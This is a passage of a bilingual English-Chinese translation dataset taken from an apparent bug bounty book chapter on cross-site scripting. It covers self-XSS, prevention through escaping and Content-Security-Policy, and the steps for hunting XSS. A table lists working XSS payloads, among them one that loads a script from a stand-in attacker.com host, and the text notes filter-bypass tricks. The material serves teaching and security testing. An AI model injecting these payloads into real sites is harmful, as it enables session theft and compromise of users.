- en: For example, let’s say that a field on a user’s dashboard is vulnerable to stored
    XSS. But since only the victim can see and edit the field, there is no way for
    an attacker to deliver the payload unless the attacker can somehow trick the victim
    into changing the value of the field into the XSS payload.
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，假设用户仪表板上的一个字段易受存储型 XSS 攻击。但由于只有受害者能够看到并编辑该字段，因此除非攻击者能够以某种方式欺骗受害者将字段的值更改为
    XSS 有效载荷，否则攻击者无法传递有效载荷。
- en: If you’ve ever seen social media posts or text messages telling you to paste
    a piece of code into your browser to “do something cool,” it was probably attack
    code aimed at tricking you into launching self-XSS against yourself. Attackers
    often embed a piece of malicious payload (usually via a shortened URL like *bitly.com*
    so victims won’t suspect anything) into a complicated-looking piece of code and
    use social media to fool unsuspecting users into attacking themselves.
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你曾见过社交媒体帖子或短信，告诉你将一段代码粘贴到浏览器中以“做点有趣的事情”，那很可能是攻击代码，旨在欺骗你自己发起自我 XSS 攻击。攻击者通常会将恶意有效载荷（通常通过缩短的
    URL，如 *bitly.com*，以便受害者不会怀疑）嵌入到一段复杂的代码中，并利用社交媒体诱骗毫无戒心的用户攻击自己。
- en: In bug bounties, self-XSS bugs are not usually accepted as valid submissions
    because they require social engineering. Bugs that require *social engineering*,
    or manipulation of the victims, are not usually accepted in bug bounty programs
    because they are not purely technical issues.
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 在漏洞悬赏中，通常不会接受自我 XSS 漏洞作为有效提交，因为它们需要社会工程学。需要 *社会工程学* 或操控受害者的漏洞通常不会在漏洞悬赏计划中被接受，因为这些问题不完全是技术问题。
- en: Prevention
  id: totrans-89
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 预防
- en: 'To prevent XSS, an application should implement two controls: robust input
    validation and contextual output escaping and encoding. Applications should never
    insert user-submitted data directly into an HTML document—including, for example,
    inside `<script>` tags, HTML tag names, or attribute names. Instead, the server
    should validate that user-submitted input doesn’t contain dangerous characters
    that might influence the way browsers interpret the information on the page. For
    example, user input containing the string `"<script>"` is a good indicator that
    the input contains an XSS payload. In this case, the server could block the request,
    or sanitize it by removing or escaping special characters before further processing.'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 为了防止 XSS 攻击，应用程序应该实施两项控制措施：强健的输入验证和上下文输出转义与编码。应用程序绝不应直接将用户提交的数据插入到 HTML 文档中——例如，在
    `<script>` 标签内、HTML 标签名或属性名中。相反，服务器应该验证用户提交的输入是否包含可能影响浏览器解析页面信息的危险字符。例如，包含字符串`"<script>"`的用户输入是一个良好的指示，表明该输入包含
    XSS 有害负载。在这种情况下，服务器可以阻止该请求，或者通过删除或转义特殊字符来清理输入，然后再进行进一步处理。
- en: '*Escaping* refers to the practice of encoding special characters so that they
    are interpreted literally instead of as a special character by the programs or
    machines that process the characters. There are different ways of encoding a character.
    Applications will need to encode the user input based on where it will be embedded.
    If the user input is inserted into `<script>` tags, it needs to be encoded in
    JavaScript format. The same goes for input inserted into HTML, XML, JSON, and
    CSS files.'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: '*转义*是指将特殊字符进行编码，以便它们被处理字符的程序或机器按字面意思解读，而不是作为特殊字符。编码字符的方法有多种。应用程序需要根据用户输入将其编码为不同格式，具体取决于输入将嵌入的位置。如果用户输入被插入到
    `<script>` 标签中，则需要以 JavaScript 格式进行编码。插入 HTML、XML、JSON 和 CSS 文件中的输入也同样如此。'
- en: In the context of our example, the application needs to encode special characters
    into a format used by HTML documents. For example, the left and right angle brackets
    can be encoded into HTML characters `&lt` and `&gt`. To prevent XSS, the application
    should escape characters that have special meaning in HTML, such as the `&` character,
    the angle brackets `<` and `>`, single and double quotes, and the forward-slash
    character.
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们示例的上下文中，应用程序需要将特殊字符编码为 HTML 文档所使用的格式。例如，左尖括号和右尖括号可以编码为 HTML 字符 `&lt` 和 `&gt`。为了防止
    XSS，应用程序应该转义在 HTML 中具有特殊含义的字符，如 `&` 字符、尖括号 `<` 和 `>`、单引号和双引号，以及斜杠字符 `/`。
- en: Escaping ensures that browsers won’t misinterpret these characters as code to
    execute. This is what most modern applications do to prevent XSS. The application
    should do this for every piece of user input that will be rendered or accessed
    by a user’s browser. Many modern JavaScript frameworks such as React, Angular
    2+, and Vue.js automatically do this for you, so many XSS vulnerabilities can
    be prevented by choosing the right JavaScript framework to use.
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 转义确保浏览器不会误将这些字符解读为执行的代码。这是大多数现代应用程序防止 XSS 攻击的做法。应用程序应该对每个用户输入的内容进行这种转义，以防该内容被用户的浏览器渲染或访问。许多现代
    JavaScript 框架，如 React、Angular 2+ 和 Vue.js，都会自动为你处理这个问题，因此通过选择合适的 JavaScript 框架，很多
    XSS 漏洞都能得到防范。
- en: The prevention of DOM-based XSS requires a different approach. Since the malicious
    user input won’t pass through the server, sanitizing the data that enters and
    departs from the server won’t work. Instead, applications should avoid code that
    rewrites the HTML document based on user input, and the application should implement
    client-side input validation before it is inserted into the DOM.
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 防止基于 DOM 的 XSS 需要不同的方法。由于恶意用户输入不会通过服务器，因此清理进出服务器的数据无法起作用。相反，应用程序应避免基于用户输入重写
    HTML 文档的代码，并且应用程序应该在输入被插入到 DOM 中之前实施客户端输入验证。
- en: You can also take measures to mitigate the impact of XSS flaws if they do happen.
    First, you can set the `HttpOnly` flag on sensitive cookies that your site uses.
    This prevents attackers from stealing those cookies via XSS. You should also implement
    the `Content-Security-Policy` HTTP response header. This header lets you restrict
    how resources such as JavaScript, CSS, or images load on your web pages. To prevent
    XSS, you can instruct the browser to execute only scripts from a list of sources.
    For more information about preventing XSS attacks, visit the OWASP XSS prevention
    cheat sheet, [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 如果XSS漏洞确实发生，你也可以采取措施减轻其影响。首先，你可以在你的网站使用的敏感Cookie上设置`HttpOnly`标志，这样可以防止攻击者通过XSS窃取这些Cookie。你还应该实施`Content-Security-Policy`
    HTTP响应头。这个头部允许你限制如何加载网页上的资源，比如JavaScript、CSS或图片。为了防止XSS攻击，你可以指示浏览器仅从一个资源列表中执行脚本。有关防止XSS攻击的更多信息，请访问OWASP
    XSS防范备忘单：[https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)。
- en: Hunting for XSS
  id: totrans-96
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: XSS漏洞狩猎
- en: 'Look for XSS in places where user input gets rendered on a page. The process
    will vary for the different types of XSS, but the central principle remains the
    same: check for reflected user input.'
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 在用户输入被渲染到页面上的地方寻找XSS漏洞。不同类型的XSS攻击过程可能会有所不同，但核心原则保持不变：检查反射的用户输入。
- en: 'In this section, we’ll hunt for XSS in web applications. But it’s important
    to remember that XSS vulnerabilities can also arise outside normal web applications.
    You can hunt for XSS in applications that communicate via non-HTTP protocols such
    as SMTP, SNMP, and DNS. Sometimes commercial apps such as email apps and other
    desktop apps receive data from these protocols. If you are interested in these
    techniques, you can check out Offensive Security’s Advanced Web Attacks and Exploitation
    training: [https://www.offensive-security.com/awae-oswe/](https://www.offensive-security.com/awae-oswe/).'
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将寻找Web应用程序中的XSS漏洞。但重要的是要记住，XSS漏洞也可能在正常Web应用程序以外的地方出现。你可以在通过非HTTP协议（如SMTP、SNMP和DNS）通信的应用程序中寻找XSS。有时，像电子邮件应用程序和其他桌面应用程序这样的商业应用也会接收来自这些协议的数据。如果你对这些技术感兴趣，可以查看Offensive
    Security的高级Web攻击与利用培训：[https://www.offensive-security.com/awae-oswe/](https://www.offensive-security.com/awae-oswe/)。
- en: Before you start hunting for any vulnerability, it’s good to have Burp Suite
    or your preferred proxy on standby. Make sure you’ve configured your proxy to
    work with your browser. You can find instructions on how to do that in Chapter
    4.
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 在开始寻找任何漏洞之前，最好准备好Burp Suite或你喜欢的代理工具。确保你已经配置好代理与浏览器的连接。你可以在第4章找到相关配置说明。
- en: 'Step 1: Look for Input Opportunities'
  id: totrans-100
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 步骤 1：寻找输入机会
- en: First, look for opportunities to submit user input to the target site. If you’re
    attempting stored XSS, search for places where input gets stored by the server
    and later displayed to the user, including comment fields, user profiles, and
    blog posts. The types of user input that are most often reflected back to the
    user are forms, search boxes, and name and username fields in sign-ups.
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，寻找向目标站点提交用户输入的机会。如果你尝试进行存储型XSS攻击，搜索服务器存储并后续展示给用户的输入位置，包括评论字段、用户个人资料和博客文章。最常被反射回用户的用户输入类型通常是表单、搜索框以及注册时的姓名和用户名字段。
- en: 'Don’t limit yourself to text input fields, either. Sometimes drop-down menus
    or numeric fields can allow you to perform XSS, because even if you can’t enter
    your payload on your browser, your proxy might let you insert it directly into
    the request. To do that, you can turn on your proxy’s traffic interception and
    modify the request before forwarding it to the server. For example, say a user
    input field seems to accept only numeric values on the web page, such as the `age`
    parameter in this `POST` request:'
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 不要仅仅局限于文本输入字段。有时下拉菜单或数字字段也可能允许你执行XSS攻击，因为即使你不能在浏览器中输入有效负载，代理也可能允许你直接将其插入到请求中。为了实现这一点，你可以开启代理的流量拦截功能，在将请求转发到服务器之前修改请求。例如，假设一个用户输入字段似乎只接受数字值，例如这个`POST`请求中的`age`参数：
- en: '[PRE17]'
  id: totrans-103
  prefs: []
  type: TYPE_PRE
  zh: '[PRE17]'
- en: 'You can still attempt to submit an XSS payload by intercepting the request
    via a web proxy and changing the input value:'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 你仍然可以通过通过Web代理拦截请求并更改输入值来尝试提交XSS有效负载：
- en: '[PRE18]'
  id: totrans-105
  prefs: []
  type: TYPE_PRE
  zh: '[PRE18]'
- en: In Burp, you can edit the request directly in the Proxy tab ([Figure 6-6](#figure6-6)).
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 在Burp中，你可以直接在Proxy选项卡中编辑请求（[图6-6](#figure6-6)）。
- en: '![f06006](image_fi/501546c06/f06006.png)'
  id: totrans-107
  prefs: []
  type: TYPE_IMG
  zh: '![f06006](image_fi/501546c06/f06006.png)'
- en: 'Figure 6-6: Intercept the outgoing request to edit it before relaying it to
    the server.'
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6-6：拦截传出的请求，在将其转发到服务器之前进行编辑。
- en: After you’re done editing, click **Forward** to forward the request to the server
    ([Figure 6-7](#figure6-7)).
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 编辑完成后，点击 **Forward** 将请求转发到服务器（[图 6-7](#figure6-7)）。
- en: '![f06007](image_fi/501546c06/f06007.png)'
  id: totrans-110
  prefs: []
  type: TYPE_IMG
  zh: '![f06007](image_fi/501546c06/f06007.png)'
- en: 'Figure 6-7: Change the URL post request parameter to your XSS payload.'
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 图 6-7：将 URL POST 请求参数更改为你的 XSS 有效载荷。
- en: If you’re hoping to find reflected and DOM XSS, look for user input in URL parameters,
    fragments, or pathnames that get displayed to the user. A good way to do this
    is to insert a custom string into each URL parameter and check whether it shows
    up in the returned page. Make this string specific enough that you’ll be sure
    your input caused it if you see it rendered. For example, I like to use the string
    `"XSS_BY_VICKIE"`. Insert your custom string into every user-input opportunity
    you can find. Then, when you view the page in the browser, search the page’s source
    code for it (you can access a page’s source code by right-clicking a page and
    selecting View Source) by using your browser’s page-search functionality (usually
    triggered by pressing CTRL-F). This should give you an idea of which user input
    fields appear in the resulting web page.
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你希望找到反射型和 DOM 型 XSS，请查找 URL 参数、片段或路径中会显示给用户的用户输入。一个好的方法是将自定义字符串插入到每个 URL 参数中，并检查它是否出现在返回的页面中。确保这个字符串足够具体，这样如果你看到它被呈现出来，你就能确认是你的输入导致的。例如，我喜欢使用字符串
    `"XSS_BY_VICKIE"`。将你的自定义字符串插入到你能找到的每个用户输入点中。然后，当你在浏览器中查看页面时，使用浏览器的页面搜索功能（通常是按
    CTRL-F）在页面的源代码中搜索它（你可以通过右键点击页面并选择“查看源代码”来访问页面源代码）。这应该能给你一个关于哪些用户输入字段出现在结果页面中的想法。
- en: 'Step 2: Insert Payloads'
  id: totrans-113
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 步骤 2：插入有效载荷
- en: 'Once you’ve identified the user-input opportunities present in an application,
    you can start entering a test XSS payload at the discovered injection points.
    The simplest payload to test with is an alert box:'
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦你识别出应用程序中存在的用户输入点，你就可以开始在发现的注入点处输入测试 XSS 有效载荷。最简单的测试有效载荷是一个警告框：
- en: '[PRE19]'
  id: totrans-115
  prefs: []
  type: TYPE_PRE
  zh: '[PRE19]'
- en: If the attack succeeds, you should see a pop-up on the page with the text `XSS
    by Vickie`.
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 如果攻击成功，你应该会看到一个弹出框，显示文本 `XSS by Vickie`。
- en: But this payload won’t work in typical web applications, save the most defenseless,
    because most websites nowadays implement some sort of XSS protection on their
    input fields. A simple payload like this one is more likely to work on IoT or
    embedded applications that don’t use the latest frameworks. If you are interested
    in IoT vulnerabilities, check out OWASP’s IoTGoat project at [https://github.com/OWASP/IoTGoat/](https://github.com/OWASP/IoTGoat/).
    As XSS defenses become more advanced, the XSS payloads that get around these defenses
    grow more complex too.
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 但这个有效载荷在典型的网页应用程序中是行不通的，除非是最脆弱的那些，因为如今大多数网站都对输入字段实施了某种形式的 XSS 防护。像这样的简单有效载荷更有可能在不使用最新框架的物联网或嵌入式应用程序中起作用。如果你对物联网漏洞感兴趣，可以查看
    OWASP 的 IoTGoat 项目：[https://github.com/OWASP/IoTGoat/](https://github.com/OWASP/IoTGoat/)。随着
    XSS 防护变得越来越先进，能够绕过这些防护的 XSS 有效载荷也变得越来越复杂。
- en: More Than a <script> Tag
  id: totrans-118
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
  zh: 不仅仅是 <script> 标签
- en: 'Inserting `<script>` tags into victim web pages isn’t the only way to get your
    scripts executed in victim browsers. There are a few other tricks. First, you
    can change the values of attributes in HTML tags. Some HTML attributes allow you
    to specify a script to run if certain conditions are met. For example, the `onload`
    event attribute runs a specific script after the HTML element has loaded:'
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 向受害者网页中插入 `<script>` 标签并不是唯一一种让你的脚本在受害者浏览器中执行的方法。还有一些其他技巧。首先，你可以更改 HTML 标签中属性的值。一些
    HTML 属性允许你在满足某些条件时指定要执行的脚本。例如，`onload` 事件属性会在 HTML 元素加载后运行特定的脚本：
- en: '[PRE20]'
  id: totrans-120
  prefs: []
  type: TYPE_PRE
  zh: '[PRE20]'
- en: Similarly, the `onclick` event attribute specifies the script to be executed
    when the element is clicked, and `onerror` specifies the script to run in case
    an error occurs loading the element. If you can insert code into these attributes,
    or even add a new event attribute into an HTML tag, you can create an XSS.
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 同样，`onclick` 事件属性指定了当元素被点击时要执行的脚本，`onerror` 指定了在加载元素时出现错误时要运行的脚本。如果你能将代码插入这些属性，甚至向
    HTML 标签中添加新的事件属性，你就可以创建 XSS。
- en: 'Another way you can achieve XSS is through special URL schemes, like `javascript:`
    and `data:`. The `javascript:` URL scheme allows you to execute JavaScript code
    specified in the URL. For example, entering this URL will cause an alert box with
    the text `XSS by Vickie` to appear:'
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 你还可以通过特殊的URL方案实现XSS攻击，比如`javascript:`和`data:`。`javascript:` URL方案允许你执行URL中指定的JavaScript代码。例如，输入这个URL将会弹出一个包含文本`XSS
    by Vickie`的警告框：
- en: '[PRE21]'
  id: totrans-123
  prefs: []
  type: TYPE_PRE
  zh: '[PRE21]'
- en: 'This means that if you make the user load a `javascript:` URL, you can achieve
    XSS as well. Data URLs, those that use the `data:` scheme, allow you to embed
    small files in a URL. You can use these to embed JavaScript code into URLs too:'
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 这意味着，如果你让用户加载一个`javascript:`的URL，你也可以实现XSS。数据URL，使用`data:`协议的URL，允许你将小文件嵌入到URL中。你也可以利用这些将JavaScript代码嵌入到URL中：
- en: '[PRE22]'
  id: totrans-125
  prefs: []
  type: TYPE_PRE
  zh: '[PRE22]'
- en: 'This URL will also generate an alert box*,* because the included data in the
    data URL is the base64-encoded version of the following script:'
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 这个URL也会生成一个警告框*，*因为数据URL中包含的内容是以下脚本的base64编码版本：
- en: '[PRE23]'
  id: totrans-127
  prefs: []
  type: TYPE_PRE
  zh: '[PRE23]'
- en: 'Documents contained within `data:` URLs do not need to be base64 encoded. For
    example, you can embed the JavaScript directly in the URL as follows, but base64
    encoding can often help you bypass XSS filters:'
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: '`data:` URL中包含的文档不需要进行base64编码。例如，你可以直接在URL中嵌入JavaScript，如下所示，但base64编码通常可以帮助你绕过XSS过滤器：'
- en: '[PRE24]'
  id: totrans-129
  prefs: []
  type: TYPE_PRE
  zh: '[PRE24]'
- en: 'You can utilize these URLs to trigger XSS when a site allows URL input from
    users. A site might allow the user to load an image by using a URL and use it
    as their profile picture, like this:'
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 当一个网站允许用户输入URL时，你可以利用这些URL来触发XSS攻击。一个网站可能允许用户通过URL加载图片并将其作为个人头像，例如这样：
- en: '[PRE25]'
  id: totrans-131
  prefs: []
  type: TYPE_PRE
  zh: '[PRE25]'
- en: 'The application will then render a preview on the web page by inserting the
    URL into an `<img>` tag. If you insert a JavaScript or data URL, you can trick
    the victim’s browser into loading your JavaScript code:'
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，应用程序将在网页上渲染一个预览，通过将URL插入到`<img>`标签中。如果你插入一个JavaScript或数据URL，你可以欺骗受害者的浏览器加载你的JavaScript代码：
- en: '[PRE26]'
  id: totrans-133
  prefs: []
  type: TYPE_PRE
  zh: '[PRE26]'
- en: There are many more ways to execute JavaScript code to bypass XSS protection.
    You can find more example payloads on PortSwigger at [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/).
    Different browsers also support different tags and event handlers, so you should
    always test by using multiple browsers when hunting for XSS.
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: 还有很多其他执行JavaScript代码的方法来绕过XSS保护。你可以在PortSwigger网站找到更多的有效载荷示例，网址是[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/)。不同的浏览器支持不同的标签和事件处理程序，因此在寻找XSS时，你应该始终通过多浏览器进行测试。
- en: Closing Out HTML Tags
  id: totrans-135
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
  zh: 关闭HTML标签
- en: 'When inserting an XSS payload, you’ll often have to close out a previous HTML
    tag by including its closing angle bracket. This is necessary when you’re placing
    your user input inside one HTML element but want to run JavaScript using a different
    HTML element. You have to complete the previous tag before you can start a new
    one to avoid causing a syntax error. Otherwise, the browser won’t interpret your
    payload correctly. For example, if you’re inserting input into an `<img>` tag,
    you need to close out the `<img>` tag before you can start a `<script>` tag. Here
    is the original `<img>` tag with a placeholder for user input:'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 在插入XSS有效载荷时，你通常需要通过包含前一个HTML标签的闭合尖括号来关闭它。当你将用户输入放入一个HTML元素中，但又想使用另一个HTML元素运行JavaScript时，这是必要的。你必须先完成前一个标签，然后才能开始新的标签，以避免引起语法错误。否则，浏览器将无法正确解析你的有效载荷。例如，如果你将输入插入到`<img>`标签中，你需要先关闭`<img>`标签，然后才能开始一个`<script>`标签。下面是原始的`<img>`标签，其中包含一个占位符供用户输入：
- en: '[PRE27]'
  id: totrans-137
  prefs: []
  type: TYPE_PRE
  zh: '[PRE27]'
- en: 'To close out the tag, your payload has to include the ending of an `<img>`
    tag before the JavaScript. The payload might look like this:'
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 为了关闭标签，你的有效载荷必须在JavaScript之前包含一个`<img>`标签的结束部分。这个有效载荷可能看起来像这样：
- en: '[PRE28]'
  id: totrans-139
  prefs: []
  type: TYPE_PRE
  zh: '[PRE28]'
- en: 'When injected into the `<img>` tag, the resulting HTML will look like this
    (with the injected portion in bold):'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: 当被注入到`<img>`标签中时，生成的HTML将如下所示（注入部分用粗体标出）：
- en: '[PRE29]'
  id: totrans-141
  prefs: []
  type: TYPE_PRE
  zh: '[PRE29]'
- en: This payload closes the string that was supposed to contain the user input by
    providing a double quote, then closes the `<img>` tag with a tag ending in `/>`.
    Finally, the payload injects a complete script tag after the `<img>` tag.
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: 这个有效载荷通过提供一个双引号来关闭原本应该包含用户输入的字符串，然后用以`/>`结尾的标签关闭`<img>`标签。最后，该有效载荷在`<img>`标签后注入一个完整的`<script>`标签。
- en: If your payload is not working, you can check whether your payload caused syntax
    errors in the returned document. You can inspect the returned document in your
    proxy and look for unclosed tags or other syntax issues. You can also open your
    browser’s console and see if the browser runs into any errors loading the page.
    In Firefox, you can open the console by right-clicking the page and choosing **Inspect
    Element**▶**Console**.
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您的有效载荷没有生效，可以检查是否是您的有效载荷导致了返回文档中的语法错误。您可以在代理中检查返回的文档，寻找未闭合的标签或其他语法问题。您还可以打开浏览器的控制台，查看浏览器加载页面时是否遇到任何错误。在Firefox中，您可以通过右键单击页面，选择**检查元素**▶**控制台**来打开控制台。
- en: You can find more common XSS payloads online. [Table 6-1](#table6-1) lists some
    examples.
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以在线找到更多常见的XSS有效载荷。[表6-1](#table6-1)列出了一些示例。
- en: 'Table 6-1: Common XSS Payloads'
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: 表6-1：常见的XSS有效载荷
- en: '| **Payload** | **Purpose** |'
  id: totrans-146
  prefs: []
  type: TYPE_TB
  zh: '| **有效载荷** | **目的** |'
- en: '| --- | --- |'
  id: totrans-147
  prefs: []
  type: TYPE_TB
  zh: '| --- | --- |'
- en: '| `<script>alert(1)</script>` | This is the most generic XSS payload. It will
    generate a pop-up box if the payload succeeds. |'
  id: totrans-148
  prefs: []
  type: TYPE_TB
  zh: '| `<script>alert(1)</script>` | 这是最通用的XSS有效载荷。如果有效载荷成功，它将生成一个弹出框。 |'
- en: '| `<iframe src=javascript:alert(1)>` | This payload loads JavaScript code within
    an iframe. It’s useful when `<script>` tags are banned by the XSS filter. |'
  id: totrans-149
  prefs: []
  type: TYPE_TB
  zh: '| `<iframe src=javascript:alert(1)>` | 这个有效载荷在iframe中加载JavaScript代码。当XSS过滤器禁止使用`<script>`标签时，这非常有用。
    |'
- en: '| `<body onload=alert(1)>` | This payload is useful when your input string
    can’t contain the term *script*. It inserts an HTML element that will run JavaScript
    automatically after it’s loaded. |'
  id: totrans-150
  prefs: []
  type: TYPE_TB
  zh: '| `<body onload=alert(1)>` | 这个有效载荷在您的输入字符串无法包含*script*一词时非常有用。它插入一个HTML元素，该元素将在加载后自动运行JavaScript。
    |'
- en: '| `"><img src=x onerror=prompt(1);>` | This payload closes out the previous
    tag. It then injects an `<img>` tag with an invalid source URL. Once the tag fails
    to load, it will run the JavaScript specified in the `onerror` attribute. |'
  id: totrans-151
  prefs: []
  type: TYPE_TB
  zh: '| `"><img src=x onerror=prompt(1);>` | 这个有效载荷关闭了之前的标签。然后，它插入一个带有无效源URL的`<img>`标签。当该标签加载失败时，将运行`onerror`属性中指定的JavaScript。
    |'
- en: '| `<script>alert(1)<!–` | `<!-` is the start of an HTML comment. This payload
    will comment out the rest of the line in the HTML document to prevent syntax errors.
    |'
  id: totrans-152
  prefs: []
  type: TYPE_TB
  zh: '| `<script>alert(1)<!–` | `<!-`是HTML注释的开始。这个有效载荷将注释掉HTML文档中剩余的部分，以防止语法错误。 |'
- en: '| `<a onmouseover"alert(1)">test</a>` | This payload inserts a link that will
    cause JavaScript to execute after a user hovers over the link with their cursor.
    |'
  id: totrans-153
  prefs: []
  type: TYPE_TB
  zh: '| `<a onmouseover"alert(1)">test</a>` | 这个有效载荷插入一个链接，当用户将鼠标悬停在该链接上时，将触发JavaScript执行。
    |'
- en: '| `<script src=//attacker.com/test.js>` | This payload causes the browser to
    load and run an external script hosted on the attacker’s server. |'
  id: totrans-154
  prefs: []
  type: TYPE_TB
  zh: '| `<script src=//attacker.com/test.js>` | 这个有效载荷导致浏览器加载并运行托管在攻击者服务器上的外部脚本。
    |'
- en: 'Hackers have designed many more creative payloads. Search *XSS payloads* online
    for more ideas. That said, taking a long list of payloads and trying them one
    by one can be time-consuming and unproductive. Another way of approaching manual
    XSS testing is to insert an *XSS polyglot*, a type of XSS payload that executes
    in multiple contexts. For example, it will execute regardless of whether it is
    inserted into an `<img>` tag, a `<script>` tag, or a generic `<p>` tag and can
    bypass some XSS filters. Take a look at this polyglot payload published by EdOverflow
    at [https://polyglot.innerht.ml/](https://polyglot.innerht.ml/):'
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: 黑客们设计了许多更具创意的有效载荷。可以在线搜索*XSS有效载荷*获取更多想法。不过，拿着一个长长的有效载荷列表，一一尝试可能既费时又低效。另一种进行手动XSS测试的方法是插入*XSS多重有效载荷*，这是一种能够在多种上下文中执行的XSS有效载荷。例如，无论是插入`<img>`标签、`<script>`标签还是通用的`<p>`标签，它都能执行，并且可以绕过一些XSS过滤器。看看EdOverflow发布的这个多重有效载荷：[https://polyglot.innerht.ml/](https://polyglot.innerht.ml/)：
- en: '[PRE30]'
  id: totrans-156
  prefs: []
  type: TYPE_PRE
  zh: '[PRE30]'
- en: The details of this payload are beyond the scope of the book, but it contains
    multiple ways of creating an XSS—so if one method fails, another one can still
    induce the XSS.
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: 这个有效载荷的细节超出了本书的范围，但它包含了多种创建XSS的方法——因此，如果一种方法失败，另一种方法仍然可以引发XSS。
- en: 'Another way of testing for XSS more efficiently is to use generic test strings
    instead of XSS payloads. Insert a string of special HTML characters often used
    in XSS payloads, such as the following: `>''<"//:=;!--`. Take note of which ones
    the application escapes and which get rendered directly. Then you can construct
    test XSS payloads from the characters that you know the application isn’t properly
    sanitizing.'
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: 另一种更高效地测试XSS的方法是使用通用测试字符串，而不是XSS有效载荷。插入一些常用于XSS有效载荷的特殊HTML字符，例如：`>'<"//:=;!--`。记下哪些字符被应用程序转义，哪些字符直接呈现。然后，您可以根据应用程序未正确清理的字符构造测试XSS有效载荷。
- en: 'Blind XSS flaws are harder to detect; since you can’t detect them by looking
    for reflected input, you can’t test for them by trying to generate an alert box.
    Instead, try making the victim’s browser generate a request to a server you own.
    For example, you can submit the following payload, which will make the victim’s
    browser request the page */xss* on your server:'
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: 盲XSS缺陷更难以检测；由于您不能通过查看反射输入来检测它们，因此无法通过尝试生成弹出框来测试它们。相反，尝试让受害者的浏览器生成对您拥有的服务器的请求。例如，您可以提交以下有效载荷，这将使受害者的浏览器请求您服务器上的*/xss*页面：
- en: '[PRE31]'
  id: totrans-160
  prefs: []
  type: TYPE_PRE
  zh: '[PRE31]'
- en: Then, you can monitor your server logs to see if anyone requests that page.
    If you see a request to the path */xss*, a blind XSS has been triggered! Tools
    like XSS Hunter ([https://xsshunter.com/features](https://xsshunter.com/features))
    can automate this process. We’ll also talk more about setting up a server to test
    for multiple types of vulnerabilities in Chapter 13.
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，您可以监控服务器日志，查看是否有人请求该页面。如果看到对路径*/xss*的请求，那么一个盲目XSS已被触发！像XSS Hunter（[https://xsshunter.com/features](https://xsshunter.com/features)）这样的工具可以自动化此过程。我们将在第13章中进一步讨论如何设置服务器以测试多种类型的漏洞。
- en: Finally, although hackers typically discover new XSS vectors manually, a good
    way to automatically test a site for already-known XSS vectors is through fuzzing.
    We’ll talk about fuzzing and automatic bug finding in Chapter 25.
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，尽管黑客通常手动发现新的XSS向量，但一种自动测试网站是否存在已知XSS向量的好方法是通过模糊测试（fuzzing）。我们将在第25章讨论模糊测试和自动化漏洞发现。
- en: 'Step 3: Confirm the Impact'
  id: totrans-163
  prefs:
